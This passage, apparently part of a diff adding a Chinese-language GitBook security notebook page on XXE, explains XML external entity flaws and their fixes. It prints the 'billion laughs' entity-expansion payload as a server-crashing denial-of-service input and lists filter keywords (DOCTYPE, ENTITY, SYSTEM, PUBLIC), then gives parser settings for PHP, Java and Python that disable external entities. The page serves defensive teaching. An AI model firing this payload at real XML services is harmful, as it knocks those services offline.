+<h2 id="&#x62D2;&#x7EDD;&#x670D;&#x52A1;&#x653B;&#x51FB;"><a name="&#x62D2;&#x7EDD;&#x670D;&#x52A1;&#x653B;&#x51FB;" class="anchor-navigation-ex-anchor" href="#&#x62D2;&#x7EDD;&#x670D;&#x52A1;&#x653B;&#x51FB;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x62D2;&#x7EDD;&#x670D;&#x52A1;&#x653B;&#x51FB;</h2>
+<ol>
+<li>To crash the server / Cause denial of service:</li>
+</ol>
+<pre><code class="lang-xml"> <span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">&quot;1.0&quot;</span><span class="hljs-meta">?&gt;</span></span>
+ <span class="hljs-meta">&lt;!DOCTYPE lolz [
+ &lt;!ENTITY lol &quot;lol&quot;&gt;
+ &lt;!ENTITY lol2 &quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;&gt;
+ &lt;!ENTITY lol3 &quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;&gt;
+ &lt;!ENTITY lol4 &quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;&gt;
+ &lt;!ENTITY lol5 &quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;&gt;
+ &lt;!ENTITY lol6 &quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;&gt;
+ &lt;!ENTITY lol7 &quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;&gt;
+ &lt;!ENTITY lol8 &quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;&gt;
+ &lt;!ENTITY lol9 &quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;&gt;
+ ]&gt;</span>
+ <span class="hljs-tag">&lt;<span class="hljs-name">lolz</span>&gt;</span>&amp;lol9;<span class="hljs-tag">&lt;/<span class="hljs-name">lolz</span>&gt;</span>
+</code></pre>
+<p>&#x4E0A;&#x9762;&#x6837;&#x4F8B;&#x4EE3;&#x7801;2&#x4E2D;&#x7684;XXE&#x6F0F;&#x6D1E;&#x653B;&#x51FB;&#x5C31;&#x662F;&#x8457;&#x540D;&#x7684;&#x2019;billion laughs&#x2019; &#x653B;&#x51FB;&#x3002;</p>
+<p>(<a href="https://en.wikipedia.org/wiki/Billion_laughs)&#xFF0C;&#x8BE5;&#x653B;&#x51FB;&#x901A;&#x8FC7;&#x521B;&#x5EFA;&#x4E00;&#x9879;&#x9012;&#x5F52;&#x7684;" target="_blank">https://en.wikipedia.org/wiki/Billion_laughs)&#xFF0C;&#x8BE5;&#x653B;&#x51FB;&#x901A;&#x8FC7;&#x521B;&#x5EFA;&#x4E00;&#x9879;&#x9012;&#x5F52;&#x7684;</a> XML &#x5B9A;&#x4E49;&#xFF0C;&#x5728;&#x5185;&#x5B58;&#x4E2D;&#x751F;&#x6210;&#x5341;&#x4EBF;&#x4E2A;&#x201D;Ha!&#x201D;&#x5B57;&#x7B26;&#x4E32;&#xFF0C;&#x4ECE;&#x800C;&#x5BFC;&#x81F4; DDoS &#x653B;&#x51FB;&#x3002;</p>
+<p>&#x539F;&#x7406;&#x4E3A;&#xFF1A;&#x6784;&#x9020;&#x6076;&#x610F;&#x7684;XML&#x5B9E;&#x4F53;&#x6587;&#x4EF6;&#x8017;&#x5C3D;&#x53EF;&#x7528;&#x5185;&#x5B58;&#xFF0C;&#x56E0;&#x4E3A;&#x8BB8;&#x591A;XML&#x89E3;&#x6790;&#x5668;&#x5728;&#x89E3;&#x6790;XML&#x6587;&#x6863;&#x65F6;&#x503E;&#x5411;&#x4E8E;&#x5C06;&#x5B83;&#x7684;&#x6574;&#x4E2A;&#x7ED3;&#x6784;&#x4FDD;&#x7559;&#x5728;&#x5185;&#x5B58;&#x4E2D;&#xFF0C;&#x89E3;&#x6790;&#x975E;&#x5E38;&#x6162;&#xFF0C;&#x9020;&#x6210;&#x4E86;&#x62D2;&#x7EDD;&#x670D;&#x52A1;&#x5668;&#x653B;</p>
+<p>&#x51FB;&#x3002;&#x9664;&#x4E86;&#x8FD9;&#x4E9B;&#xFF0C;&#x653B;&#x51FB;&#x8005;&#x8FD8;&#x53EF;&#x4EE5;&#x8BFB;&#x53D6;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x7684;&#x654F;&#x611F;&#x6570;&#x636E;&#xFF0C;&#x8FD8;&#x80FD;&#x901A;&#x8FC7;&#x7AEF;&#x53E3;&#x626B;&#x63CF;&#xFF0C;&#x83B7;&#x53D6;&#x540E;&#x7AEF;&#x7CFB;&#x7EDF;&#x7684;&#x5F00;&#x653E;&#x7AEF;&#x53E3;&#x3002;</p>
+<h1 id="xxe&#x6F0F;&#x6D1E;&#x4FEE;&#x590D;&#x4E0E;&#x9632;&#x5FA1;"><a name="xxe&#x6F0F;&#x6D1E;&#x4FEE;&#x590D;&#x4E0E;&#x9632;&#x5FA1;" class="anchor-navigation-ex-anchor" href="#xxe&#x6F0F;&#x6D1E;&#x4FEE;&#x590D;&#x4E0E;&#x9632;&#x5FA1;"><i class="fa fa-link" aria-hidden="true"></i></a>XXE&#x6F0F;&#x6D1E;&#x4FEE;&#x590D;&#x4E0E;&#x9632;&#x5FA1;</h1>
+<ul>
+<li><p>xxe&#x6F0F;&#x6D1E;&#x5B58;&#x5728;&#x662F;&#x56E0;&#x4E3A;XML&#x89E3;&#x6790;&#x5668;&#x89E3;&#x6790;&#x4E86;&#x7528;&#x6237;&#x53D1;&#x9001;&#x7684;&#x4E0D;&#x53EF;&#x4FE1;&#x6570;&#x636E;&#x3002;&#x7136;&#x800C;&#xFF0C;&#x8981;&#x53BB;&#x6821;&#x9A8C;DTD(document type definition)&#x4E2D;SYSTEM&#x6807;&#x8BC6;&#x7B26;&#x5B9A;&#x4E49;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x5E76;&#x4E0D;&#x5BB9;&#x6613;&#xFF0C;&#x4E5F;</p>
+<p>&#x4E0D;&#x5927;&#x53EF;&#x80FD;&#x3002;&#x5927;&#x90E8;&#x5206;&#x7684;XML&#x89E3;&#x6790;&#x5668;&#x9ED8;&#x8BA4;&#x5BF9;&#x4E8E;XXE&#x653B;&#x51FB;&#x662F;&#x8106;&#x5F31;&#x7684;&#x3002;&#x56E0;&#x6B64;&#xFF0C;&#x6700;&#x597D;&#x7684;&#x89E3;&#x51B3;&#x529E;&#x6CD5;&#x5C31;&#x662F;&#x914D;&#x7F6E;XML&#x5904;&#x7406;&#x5668;&#x53BB;&#x4F7F;&#x7528;&#x672C;&#x5730;&#x9759;&#x6001;&#x7684;DTD&#xFF0C;&#x4E0D;&#x5141;&#x8BB8;XML&#x4E2D;&#x542B;&#x6709;&#x4EFB;&#x4F55;&#x81EA;&#x5DF1;</p>
+<p>&#x58F0;&#x660E;&#x7684;DTD&#x3002;&#x901A;&#x8FC7;&#x8BBE;&#x7F6E;&#x76F8;&#x5E94;&#x7684;&#x5C5E;&#x6027;&#x503C;&#x4E3A;false&#xFF0C;XML&#x5916;&#x90E8;&#x5B9E;&#x4F53;&#x653B;&#x51FB;&#x5C31;&#x80FD;&#x591F;&#x88AB;&#x963B;&#x6B62;&#x3002;&#x56E0;&#x6B64;&#xFF0C;&#x53EF;&#x5C06;&#x5916;&#x90E8;&#x5B9E;&#x4F53;&#x3001;&#x53C2;&#x6570;&#x5B9E;&#x4F53;&#x548C;&#x5185;&#x8054;DTD &#x90FD;&#x88AB;&#x8BBE;&#x7F6E;&#x4E3A;false&#xFF0C;&#x4ECE;&#x800C;&#x907F;&#x514D;&#x57FA;&#x4E8E;</p>
+<p>XXE&#x6F0F;&#x6D1E;&#x7684;&#x653B;&#x51FB;&#x3002;</p>
+</li>
+</ul>
+<h2 id="&#x65B9;&#x6848;&#x4E00;"><a name="&#x65B9;&#x6848;&#x4E00;" class="anchor-navigation-ex-anchor" href="#&#x65B9;&#x6848;&#x4E00;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x65B9;&#x6848;&#x4E00;</h2>
+<ul>
+<li><p>&#x4F7F;&#x7528;&#x5F00;&#x53D1;&#x8BED;&#x8A00;&#x63D0;&#x4F9B;&#x7684;&#x7981;&#x7528;&#x5916;&#x90E8;&#x5B9E;&#x4F53;&#x7684;&#x65B9;&#x6CD5;</p>
+</li>
+<li><p>PHP</p>
+</li>
+<li><ul>
+<li>libxml_disable_entity_loader(true);</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li><p>JAVA</p>
+</li>
+<li><ul>
+<li>DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();</li>
+<li>dbf.setExpandEntityReferences(false);</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li><p>Python</p>
+</li>
+<li><ul>
+<li>from lxml import etree</li>
+<li>xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</li>
+</ul>
+</li>
+</ul>
+<h2 id="&#x65B9;&#x6848;&#x4E8C;"><a name="&#x65B9;&#x6848;&#x4E8C;" class="anchor-navigation-ex-anchor" href="#&#x65B9;&#x6848;&#x4E8C;"><i class="fa fa-link" aria-hidden="true"></i></a>&#x65B9;&#x6848;&#x4E8C;</h2>
+<ul>
+<li>&#x8FC7;&#x6EE4;&#x7528;&#x6237;&#x63D0;&#x4EA4;&#x7684;XML&#x6570;&#x636E;</li>
+</ul>
+<p>&#x8FC7;&#x6EE4;&#x5173;&#x952E;&#x8BCD;&#xFF1A;&lt;!DOCTYPE &#x548C; &lt;!ENTITY&#xFF0C;&#x6216;&#x8005; SYSTEM &#x548C; PUBLIC </p>
+
+<script>console.log("plugin-popup....");document.onclick = function(e){ e.target.tagName === "IMG" && window.open(e.target.src,e.target.src)}</script><style>img{cursor:pointer}</style>
+                                
+                                </section>
+                            
+    </div>
+    <div class="search-results">
+        <div class="has-results">
+            
+            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
+            <ul class="search-results-list"></ul>
+            
+        </div>
+        <div class="no-results">
+            
+            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
+            
+        </div>
+    </div>
+</div>
+
+                        </div>
+                    </div>
+                
+            </div>
+
+            
+                
+                <a href="./" class="navigation navigation-prev " aria-label="Previous page: 逻辑漏洞">
+                    <i class="fa fa-angle-left"></i>
+                </a>
+                
+                
+                <a href="变量覆盖.html" class="navigation navigation-next " aria-label="Next page: 变量覆盖">
+                    <i class="fa fa-angle-right"></i>
+                </a>
+                
+            
+        
+    </div>
+
+    <script>
+        var gitbook = gitbook || [];
+        gitbook.push(function() {
+            gitbook.page.hasChanged({"page":{"title":"XXE","level":"1.6.1","depth":2,"next":{"title":"变量覆盖","level":"1.6.2","depth":2,"path":"NoteBook/逻辑漏洞/变量覆盖.md","ref":"NoteBook/逻辑漏洞/变量覆盖.md","articles":[]},"previous":{"title":"逻辑漏洞","level":"1.6","depth":1,"path":"NoteBook/逻辑漏洞/README.md","ref":"NoteBook/逻辑漏洞/README.md","articles":[{"title":"XXE","level":"1.6.1","depth":2,"path":"NoteBook/逻辑漏洞/XXE.md","ref":"NoteBook/逻辑漏洞/XXE.md","articles":[]},{"title":"变量覆盖","level":"1.6.2","depth":2,"path":"NoteBook/逻辑漏洞/变量覆盖.md","ref":"NoteBook/逻辑漏洞/变量覆盖.md","articles":[]},{"title":"文件包含","level":"1.6.3","depth":2,"path":"NoteBook/逻辑漏洞/文件包含.md","ref":"NoteBook/逻辑漏洞/文件包含.md","articles":[]}]},"dir":"ltr"},"config":{"plugins":["back-to-top-button","expandable-chapters","-lunr","-search","search-pro","splitter","popup","ancre-navigation","livereload"],"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"livereload":{},"splitter":{},"search-pro":{},"popup":{},"fontsettings":{"theme":"white","family":"sans","size":2},"highlight":{},"back-to-top-button":{},"ancre-navigation":{"associatedWithSummary":true,"float":{"level1Icon":"","level2Icon":"","level3Icon":"","showLevelIcon":false},"mode":"float","multipleH1":true,"pageTop":{"level1Icon":"","level2Icon":"","level3Icon":"","showLevelIcon":false},"printLog":false,"showLevel":true},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"expandable-chapters":{}},"theme":"default","author":"Mpy","pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"variables":{},"title":"Java","language":"zh-hans","gitbook":"3.x.x"},"file":{"path":"NoteBook/逻辑漏洞/XXE.md","mtime":"2021-04-05T12:30:09.642Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2021-04-06T05:31:19.898Z"},"basePath":"../..","book":{"language":""}});
+        });
+    </script>
+</div>
+
+        
+    <script src="../../gitbook/gitbook.js"></script>
+    <script src="../../gitbook/theme.js"></script>
+    
+        
+        <script src="../../gitbook/gitbook-plugin-back-to-top-button/plugin.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-expandable-chapters/expandable-chapters.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-search-pro/jquery.mark.min.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-search-pro/search.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-splitter/splitter.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-livereload/plugin.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-sharing/buttons.js"></script>
+        
+    
+        
+        <script src="../../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
+        
+    
+
+    </body>
+</html>
+
